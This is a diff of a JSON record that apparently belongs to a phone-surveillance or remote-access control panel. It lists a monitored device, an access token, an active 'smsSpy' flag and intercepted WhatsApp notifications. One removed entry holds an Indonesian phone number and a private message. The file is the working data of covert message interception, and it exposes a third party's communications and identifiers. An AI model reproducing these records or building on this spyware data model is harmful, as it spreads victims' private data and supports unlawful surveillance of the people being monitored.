@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776959178958,
+    "lastSeen": 1776959191254,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎72 pesan dari 41 chat",
+        "time": "23/04 23:46",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776959191629
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4011,14 +4019,6 @@
         "time": "23/04 21:42",
         "pkg": "com.whatsapp",
         "receivedAt": 1776951732660
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 821-4849-9859",
-        "content": "Telescopic bawa kembali ke markas",
-        "time": "23/04 21:42",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776951732615
       }
     ],
     "galleryPhotos": [],
